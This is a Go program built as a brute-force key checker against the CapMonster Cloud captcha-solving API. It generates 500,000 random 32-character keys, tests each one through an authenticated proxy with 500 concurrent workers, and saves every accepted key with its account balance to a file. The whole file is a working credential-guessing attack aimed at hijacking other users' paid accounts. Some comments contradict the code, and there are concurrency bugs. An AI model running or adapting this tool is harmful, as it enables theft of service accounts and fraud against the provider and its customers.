package main

import (
    "bufio"
    "encoding/json"
    "flag"
    "fmt"
    "log"
    "net/http"
    "net/url"
    "os"
    "strings"
    "sync"
    "time"
    "math/rand"
    "github.com/fatih/color"
)

type CapMonsterChecker struct {
    keysCh       chan string
    wg           sync.WaitGroup
    validKeys    int
    invalidKeys  int
    validKeysFile *os.File
}

var (
    numWorkers = flag.Int("workers", 500, "Number of workers")
    filename   = flag.String("file", "keys.txt", "File with keys")
    apiEndpoint = flag.String("endpoint", "https://api.capmonster.cloud/getBalance", "API endpoint")
    proxyAddr  = flag.String("proxy", "INSERT_IP:PORT", "Proxy address")
    proxyUser  = flag.String("proxyUser", "INSERT_PROXY_USER", "Proxy username")
    proxyPass  = flag.String("proxyPass", "INSERT_PROXY_PASS", "Proxy password")
)

func NewCapMonsterChecker(filename string, numWorkers int) (*CapMonsterChecker, error) {
    keysCh := make(chan string)
    c := &CapMonsterChecker{keysCh: keysCh}

    c.wg.Add(numWorkers)
    for i := 0; i < numWorkers; i++ {
        go c.worker()
    }

    if err := c.loadKeys(filename); err != nil {
        return nil, err
    }

    // Open the file for valid keys.
    f, err := os.OpenFile("valid_keys.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        return nil, err
    }
    c.validKeysFile = f

    return c, nil
}

func (c *CapMonsterChecker) loadKeys(filename string) error {
    f, err := os.Open(filename)
    if err != nil {
        return err
    }
    defer f.Close()

    scanner := bufio.NewScanner(f)
    for scanner.Scan() {
        c.keysCh <- scanner.Text()
    }

    if err := scanner.Err(); err != nil {
        return err
    }

    close(c.keysCh)
    return nil
}

func (c *CapMonsterChecker) worker() {
    defer c.wg.Done()

    for key := range c.keysCh {
        if err := c.checkKey(key); err != nil {
            log.Printf("[!] Error checking key: %s | %s\n", key, err)
        }
    }
}

func (c *CapMonsterChecker) checkKey(key string) error {
    proxyURL, err := url.Parse(fmt.Sprintf("http://%s:%s@%s", *proxyUser, *proxyPass, *proxyAddr))
    if err != nil {
        return err
    }

    client := &http.Client{
        Transport: &http.Transport{
            Proxy: http.ProxyURL(proxyURL),
        },
    }

    reqBody := fmt.Sprintf(`{"clientKey": "%s"}`, key)
    req, err := http.NewRequest("POST", *apiEndpoint, strings.NewReader(reqBody))
    if err != nil {
        return err
    }
    req.Header.Set("Content-Type", "application/json")

    for i := 0; i < 3; i++ { // retry up to 3 times
        resp, err := client.Do(req)
        if err != nil {
            log.Printf("[!] Error checking key: %s | %s\n", key, err)
            time.Sleep(time.Second)
            continue
        }

        defer resp.Body.Close()

        if resp.StatusCode == http.StatusOK {
            var data struct {
                Balance float64 `json:"balance"`
            }
            if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
                log.Printf("[!] Error parsing JSON response for key: %s | %s\n", key, err)
                return err
            }
            color.Green("[+] Valid Key: %s | Balance: %f\n", key, data.Balance)
            c.validKeys++

            // Write valid key and balance to the file.
            if _, err := fmt.Fprintf(c.validKeysFile, "%s | %f\n", key, data.Balance); err != nil {
                log.Printf("[!] Error writing to file: %v\n", err)
                return err
            }
            c.validKeysFile.Sync() // Ensure the data is written to the file
        } else if resp.StatusCode == http.StatusNotFound {
            color.Red("[-] Invalid Key: %s\n", key)
            c.invalidKeys++
        } else {
            color.Yellow("[!] Error checking key: %s | %d\n", key, resp.StatusCode)
        }
        break
    }

    return nil
}

func (c *CapMonsterChecker) Wait() {
    c.wg.Wait()
    c.validKeysFile.Close()
    log.Printf("[*] Checked all keys. Valid: %d, Invalid: %d", c.validKeys, c.invalidKeys)
}

func GenerateKeys(filename string, count int) error {
    rand.Seed(time.Now().UnixNano())
    chars := "abcdefghijklmnopqrstuvwxyz0123456789"

    f, err := os.Create(filename)
    if err != nil {
        return err
    }
    defer f.Close()

    w := bufio.NewWriter(f)
    start := time.Now()
    for i := 0; i < count; i++ {
        var b []byte
        for i := 0; i < 32; i++ {
            b = append(b, chars[rand.Intn(len(chars))])
        }
        _, err := w.Write(b)
        if err != nil {
            return err
        }
        _, err = w.WriteString("\n")
        if err != nil {
            return err
        }
    }
    w.Flush()
    elapsed := time.Since(start)
    log.Printf("[*] Generated %d keys in %v seconds", count, elapsed.Seconds())
    return nil
}

func main() {
    flag.Parse()

    if err := GenerateKeys(*filename, 500000); err != nil { // generate 100,000 keys and save them to keys.txt
		log.Fatalf("[!] Error generating keys: %v\n", err)
    }

    c, err := NewCapMonsterChecker(*filename, *numWorkers) // use 10 workers
    if err != nil {
        log.Fatalf("[!] Error creating checker: %v\n", err)
    }
    c.Wait()
}